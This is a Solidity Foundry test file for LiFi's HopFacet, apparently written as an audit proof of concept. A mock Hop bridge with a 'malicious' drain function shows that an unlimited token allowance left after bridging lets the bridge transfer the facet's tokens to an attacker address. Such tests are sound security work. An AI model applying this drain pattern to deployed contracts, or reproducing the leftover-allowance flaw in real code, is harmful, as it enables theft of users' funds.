// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {HopFacet} from "lifi/Facets/HopFacet.sol";
import {IHopBridge} from "lifi/Interfaces/IHopBridge.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockHopBridge is IHopBridge {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function sendToL2(
        uint256,
        address,
        uint256 amount,
        uint256,
        uint256,
        address,
        uint256
    ) external payable override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function swapAndSend(
        uint256,
        address,
        uint256 amount,
        uint256,
        uint256,
        uint256,
        uint256,
        uint256
    ) external payable override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function send(
        uint256,
        address,
        uint256 amount,
        uint256,
        uint256,
        uint256
    ) external override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    // malicious function to drain tokens using remaining allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract HopFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockHopBridge internal bridge;
    HopFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        bridge = new MockHopBridge(address(token));
        facet = new HopFacet();

        // register bridge as owner (address(0))
        HopFacet.Config[] memory configs = new HopFacet.Config[](1);
        configs[0] = HopFacet.Config({assetId: address(token), bridge: address(bridge)});
        vm.prank(address(0));
        facet.initHop(configs);

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 2,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        HopFacet.HopData memory hopData = HopFacet.HopData({
            bonderFee: 0,
            amountOutMin: 0,
            deadline: block.timestamp + 1,
            destinationAmountOutMin: 0,
            destinationDeadline: block.timestamp + 1,
            relayer: address(0),
            relayerFee: 0,
            nativeFee: 0
        });

        facet.startBridgeTokensViaHop(bridgeData, hopData);

        // allowance remains set after bridging
        assertEq(token.allowance(address(facet), address(bridge)), type(uint256).max);

        // attacker sends tokens to facet and bridge drains them
        token.mint(address(facet), 5 ether);
        bridge.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

